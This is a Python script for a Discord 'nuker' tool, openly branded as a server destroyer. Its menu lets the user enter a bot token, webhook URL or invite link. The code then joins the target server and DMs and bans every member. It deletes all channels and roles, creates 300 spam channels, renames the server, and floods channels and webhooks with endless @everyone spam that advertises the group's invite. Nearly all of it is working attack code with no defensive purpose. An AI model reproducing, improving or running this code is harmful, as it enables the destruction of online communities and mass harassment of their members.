import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import json
import re

os.system('cls' if os.name == 'nt' else 'clear')

print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗          ║
║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗         ║
║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║         ║
║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║         ║
║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║         ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝         ║
║                                                                                       ║
║                    ██╗   ██╗ ██████╗ ███╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
║                    ██║   ██║██╔═══██╗████╗  ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
║                    ██║   ██║██║   ██║██╔██╗ ██║    ███████║███████║██║   ██║██║   ██║███████╗
║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
║                     ╚████╔╝ ╚██████╔╝██║ ╚████║    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║     HAQ MASHA VON KATIBA ULTIMATE MULTI-TOOL NUKER           ║  ║
║                    ║              DISCORD + WEBHOOK + INVITE DESTROYER            ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```YOU HAVE BEEN VON KATIBA'ED```",
    "@everyone **HAQ MASHA KILLED THIS SERVER**",
]

# ============================================
# WEBHOOK SPAMMER
# ============================================
async def webhook_spammer(webhook_url):
    print(f"\n[!] STARTING WEBHOOK SPAM ON: {webhook_url[:50]}...")
    
    spam_count = 0
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                for msg in SPAM_LIST:
                    data = {
                        "content": msg,
                        "username": random.choice(["HAQ-MASHA", "VON-KATIBA", "NUKER", "DESTROYER"])
                    }
                    async with session.post(webhook_url, json=data) as resp:
                        if resp.status == 204:
                            spam_count += 1
                            if spam_count % 50 == 0:
                                print(f"    ✓ SENT {spam_count} MESSAGES...")
                        await asyncio.sleep(0.05)
            except:
                pass
            await asyncio.sleep(0.1)

# ============================================
# SERVER INVITE JOINER & DESTROYER
# ============================================
async def join_and_destroy(invite_code, token):
    print(f"\n[!] JOINING SERVER WITH INVITE: {invite_code}")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    async with aiohttp.ClientSession() as session:
        # Join server
        async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers) as resp:
            if resp.status == 200:
                print("    ✓ JOINED SERVER SUCCESSFULLY!")
                data = await resp.json()
                guild_id = data.get('guild', {}).get('id')
                
                if guild_id:
                    print(f"    ✓ GUILD ID: {guild_id}")
                    return guild_id
            else:
                print(f"    ✗ FAILED TO JOIN: {resp.status}")
                return None

# ============================================
# BOT NUKE FUNCTION
# ============================================
async def bot_nuke(token, target_guild_id=None):
    print(f"\n[!] STARTING BOT NUKE...")
    
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="", intents=intents)
    nuke_completed = False
    
    @bot.event
    async def on_ready():
        nonlocal nuke_completed
        print(f"    ✓ BOT ONLINE: {bot.user.name}")
        
        guilds = bot.guilds
        
        # If specific guild ID provided
        if target_guild_id:
            guild = bot.get_guild(int(target_guild_id))
            if guild:
                await nuke_guild(guild, bot)
                nuke_completed = True
                await bot.close()
            else:
                print(f"    ✗ GUILD NOT FOUND! Bot might not be in that server")
                await bot.close()
        else:
            # Nuke all servers
            for guild in guilds:
                await nuke_guild(guild, bot)
            nuke_completed = True
            await bot.close()
    
    try:
        await bot.start(token)
        while not nuke_completed:
            await asyncio.sleep(1)
    except Exception as e:
        print(f"    ✗ BOT ERROR: {str(e)[:50]}")

async def nuke_guild(guild, bot):
    print(f"\n    🔥 NUKING: {guild.name}")
    
    # Get first channel
    first_channel = None
    for channel in guild.text_channels:
        first_channel = channel
        break
    
    if first_channel:
        await first_channel.send("```🔥 HAQ MASHA VON KATIBA NUKE INITIATED 🔥```")
    
    # Create webhooks
    webhooks = []
    for ch in list(guild.text_channels)[:10]:
        for i in range(3):
            try:
                webhook = await ch.create_webhook(name="VON-KATIBA")
                webhooks.append(webhook)
                await asyncio.sleep(0.05)
            except:
                pass
    
    # Torture & Ban members
    members = await guild.fetch_members(limit=None).flatten()
    tortured = 0
    for member in members:
        if not member.bot:
            try:
                for _ in range(3):
                    await member.send(HAQ_MESSAGE)
                    await asyncio.sleep(0.1)
                await member.ban(reason="VON KATIBA HAQ MASHA")
                tortured += 1
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"    ✓ TORTURED & BANNED: {tortured}")
    
    # Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.02)
        except:
            pass
    
    # Delete all roles
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.02)
            except:
                pass
    
    # Create 300 new channels
    for i in range(300):
        try:
            await guild.create_text_channel(name=f"von-katiba-{i}")
            await asyncio.sleep(0.01)
        except:
            pass
    
    # Change server name
    await guild.edit(name="VON KATIBA HAQ MASHA")
    
    # Start spam
    async def spam():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(spam())
    
    # Webhook spam
    async def webhook_spam():
        while True:
            for webhook in webhooks:
                try:
                    await webhook.send(random.choice(SPAM_LIST))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(webhook_spam())
    
    print(f"    ✓ NUKE COMPLETED ON: {guild.name}")

# ============================================
# MAIN MENU
# ============================================
async def main_menu():
    print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║                              🎯 SELECT YOUR WEAPON 🎯                                  ║
║                                                                                       ║
║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
║  │                                                                                 │  ║
║  │   [1] 🔧 BOT TOKEN NUKE     - Enter a bot token and destroy servers           │  ║
║  │                                                                                 │  ║
║  │   [2] 🪝 WEBHOOK SPAM       - Enter a webhook URL and spam it infinitely      │  ║
║  │                                                                                 │  ║
║  │   [3] 🔗 INVITE LINK NUKE   - Enter server invite and destroy it              │  ║
║  │                                                                                 │  ║
║  │   [4] 💀 ALL IN ONE         - Do everything (Bot + Webhook + Invite)          │  ║
║  │                                                                                 │  ║
║  │   [5] 🚪 EXIT               - Close the program                                 │  ║
║  │                                                                                 │  ║
║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    while True:
        choice = input("\n📌 CHOOSE AN OPTION (1-5): ")
        
        if choice == "1":
            print("\n" + "─"*70)
            token = input("🔧 ENTER BOT TOKEN: ")
            print("\n⚙️ OPTIONS:")
            print("   [1] NUKE ALL SERVERS")
            print("   [2] NUKE SPECIFIC SERVER (by invite link)")
            sub = input("   CHOOSE: ")
            
            if sub == "2":
                invite = input("🔗 ENTER SERVER INVITE LINK: ")
                invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
                if invite_code:
                    guild_id = await join_and_destroy(invite_code.group(1), token)
                    if guild_id:
                        await bot_nuke(token, guild_id)
                else:
                    print("❌ INVALID INVITE LINK!")
            else:
                await bot_nuke(token)
        
        elif choice == "2":
            print("\n" + "─"*70)
            webhook_url = input("🪝 ENTER WEBHOOK URL: ")
            if webhook_url.startswith("https://discord.com/api/webhooks/"):
                print("\n🔥 STARTING WEBHOOK SPAM...")
                await webhook_spammer(webhook_url)
            else:
                print("❌ INVALID WEBHOOK URL!")
        
        elif choice == "3":
            print("\n" + "─"*70)
            invite = input("🔗 ENTER SERVER INVITE LINK: ")
            token = input("🔧 ENTER BOT TOKEN (to join & destroy): ")
            invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
            if invite_code:
                guild_id = await join_and_destroy(invite_code.group(1), token)
                if guild_id:
                    await bot_nuke(token, guild_id)
            else:
                print("❌ INVALID INVITE LINK!")
        
        elif choice == "4":
            print("\n" + "─"*70)
            print("🔥 ALL IN ONE MODE ACTIVATED 🔥")
            
            # Bot token
            token = input("🔧 ENTER BOT TOKEN: ")
            
            # Webhook
            webhook_url = input("🪝 ENTER WEBHOOK URL (or press Enter to skip): ")
            
            # Invite
            invite = input("🔗 ENTER SERVER INVITE LINK (or press Enter to skip): ")
            
            print("\n🔥 STARTING ALL ATTACKS SIMULTANEOUSLY...\n")
            
            # Start webhook spam in background
            if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
                asyncio.create_task(webhook_spammer(webhook_url))
            
            # Join and destroy server
            if invite:
                invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
                if invite_code:
                    guild_id = await join_and_destroy(invite_code.group(1), token)
                    if guild_id:
                        await bot_nuke(token, guild_id)
                else:
                    await bot_nuke(token)
            else:
                await bot_nuke(token)
        
        elif choice == "5":
            print("\n🚪 EXITING... GOODBYE!")
            break
        
        else:
            print("❌ INVALID OPTION! TRY AGAIN.")
        
        print("\n" + "="*70)
        input("\nPRESS ENTER TO RETURN TO MENU...")
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║                              🎯 SELECT YOUR WEAPON 🎯                                  ║
║                                                                                       ║
║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
║  │   [1] 🔧 BOT TOKEN NUKE     - Enter a bot token and destroy servers           │  ║
║  │   [2] 🪝 WEBHOOK SPAM       - Enter a webhook URL and spam it infinitely      │  ║
║  │   [3] 🔗 INVITE LINK NUKE   - Enter server invite and destroy it              │  ║
║  │   [4] 💀 ALL IN ONE         - Do everything (Bot + Webhook + Invite)          │  ║
║  │   [5] 🚪 EXIT               - Close the program                                 │  ║
║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
        """)

# ============================================
# RUN
# ============================================
if __name__ == "__main__":
    asyncio.run(main_menu())
